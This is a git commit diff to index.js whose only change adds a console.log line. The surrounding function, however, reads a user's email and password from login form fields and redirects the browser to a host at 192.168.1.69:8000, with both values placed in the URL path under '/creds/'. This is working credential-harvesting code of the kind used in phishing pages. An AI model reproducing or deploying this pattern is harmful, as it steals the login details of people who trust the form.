a657df21e2dc7374ad87df5c1c081e82570a5d28
genius1512 <silvan.genius@gmail.com>
2022-02-02 20:13:12 +0100

    added console

--- index.js
+++ index.js
@@ -2,5 +2,7 @@ function enter() {
     var mail = document.getElementById("mail-inp").value;
     var password = document.getElementById("password-inp").value;
 
+    console.log("Yeeah");
+
     window.location.href = `192.168.1.69:8000/creds/${mail}/${password}`
 }
